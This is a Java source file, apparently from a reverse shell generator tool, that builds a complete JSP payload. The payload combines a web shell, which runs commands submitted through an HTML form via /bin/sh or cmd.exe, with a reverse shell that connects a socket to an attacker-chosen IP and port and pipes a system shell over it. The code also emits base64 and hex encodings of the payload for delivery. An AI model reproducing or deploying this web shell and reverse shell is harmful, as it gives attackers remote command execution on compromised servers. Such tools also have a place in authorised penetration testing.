package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class Java_two_way extends Reverse {

    protected String shellFormat = "";

    public Java_two_way(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format(
                "    try {\r\n" + //
                "        Socket socket = new Socket( \"255.10.10.10\", 9001 ); // Replace with wanted ip and port\r\n" + //
                "        Process process = Runtime.getRuntime().exec( shellPath );\r\n" + //
                "        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\r\n" + //
                "        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\r\n" + //
                "        out.println(\"port opened on \" + socket);\r\n" + //
                "     } catch( Exception e ) {}\r\n" + //
                "");
    }

    @Override
    public String getShellCode(){
        return "<%\r\n" + //
                "    /*\r\n" + //
                "     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.\r\n" + //
                "     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.\r\n" + //
                "     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button \"send\" is clicked, it will try to connect to the reverse shell again (apart from executing \r\n" + //
                "     * the command specified in the HTML form). This is to avoid to keep it simple.\r\n" + //
                "     */\r\n" + //
                "%>\r\n" + //
                "\r\n" + //
                "<%@page import=\"java.lang.*\"%>\r\n" + //
                "<%@page import=\"java.io.*\"%>\r\n" + //
                "<%@page import=\"java.net.*\"%>\r\n" + //
                "<%@page import=\"java.util.*\"%>\r\n" + //
                "\r\n" + //
                "<html>\r\n" + //
                "<head>\r\n" + //
                "    <title>jrshell</title>\r\n" + //
                "</head>\r\n" + //
                "<body>\r\n" + //
                "<form METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">\r\n" + //
                "    <input TYPE=\"text\" NAME=\"shell\">\r\n" + //
                "    <input TYPE=\"submit\" VALUE=\"Send\">\r\n" + //
                "</form>\r\n" + //
                "<pre>\r\n" + //
                "<%\r\n" + //
                "    // Define the OS\r\n" + //
                "    String shellPath = null;\r\n" + //
                "    try\r\n" + //
                "    {\r\n" + //
                "        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\r\n" + //
                "            shellPath = new String(\"/bin/sh\");\r\n" + //
                "        } else {\r\n" + //
                "            shellPath = new String(\"cmd.exe\");\r\n" + //
                "        }\r\n" + //
                "    } catch( Exception e ){}\r\n" + //
                "    // INNER HTML PART\r\n" + //
                "    if (request.getParameter(\"shell\") != null) {\r\n" + //
                "        out.println(\"Command: \" + request.getParameter(\"shell\") + \"\\n" + //
                "<BR>\");\r\n" + //
                "        Process p;\r\n" + //
                "        if (shellPath.equals(\"cmd.exe\"))\r\n" + //
                "            p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"shell\"));\r\n" + //
                "        else\r\n" + //
                "            p = Runtime.getRuntime().exec(\"/bin/sh -c \" + request.getParameter(\"shell\"));\r\n" + //
                "        OutputStream os = p.getOutputStream();\r\n" + //
                "        InputStream in = p.getInputStream();\r\n" + //
                "        DataInputStream dis = new DataInputStream(in);\r\n" + //
                "        String disr = dis.readLine();\r\n" + //
                "        while ( disr != null ) {\r\n" + //
                "            out.println(disr);\r\n" + //
                "            disr = dis.readLine();\r\n" + //
                "        }\r\n" + //
                "    }\r\n" + //
                "    // TCP PORT PART\r\n" + //
                "    class StreamConnector extends Thread\r\n" + //
                "    {\r\n" + //
                "        InputStream wz;\r\n" + //
                "        OutputStream yr;\r\n" + //
                "        StreamConnector( InputStream wz, OutputStream yr ) {\r\n" + //
                "            this.wz = wz;\r\n" + //
                "            this.yr = yr;\r\n" + //
                "        }\r\n" + //
                "        public void run()\r\n" + //
                "        {\r\n" + //
                "            BufferedReader r  = null;\r\n" + //
                "            BufferedWriter w = null;\r\n" + //
                "            try\r\n" + //
                "            {\r\n" + //
                "                r  = new BufferedReader(new InputStreamReader(wz));\r\n" + //
                "                w = new BufferedWriter(new OutputStreamWriter(yr));\r\n" + //
                "                char buffer[] = new char[8192];\r\n" + //
                "                int length;\r\n" + //
                "                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )\r\n" + //
                "                {\r\n" + //
                "                    w.write( buffer, 0, length );\r\n" + //
                "                    w.flush();\r\n" + //
                "                }\r\n" + //
                "            } catch( Exception e ){}\r\n" + //
                "            try\r\n" + //
                "            {\r\n" + //
                "                if( r != null )\r\n" + //
                "                    r.close();\r\n" + //
                "                if( w != null )\r\n" + //
                "                    w.close();\r\n" + //
                "            } catch( Exception e ){}\r\n" + //
                "        }\r\n" + //
                "    }\r\n" + //
                " \r\n" + //
                shellFormat +
                "%>\r\n" + //
                "</pre>\r\n" + //
                "</body>\r\n" + //
                "</html>";
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
 
}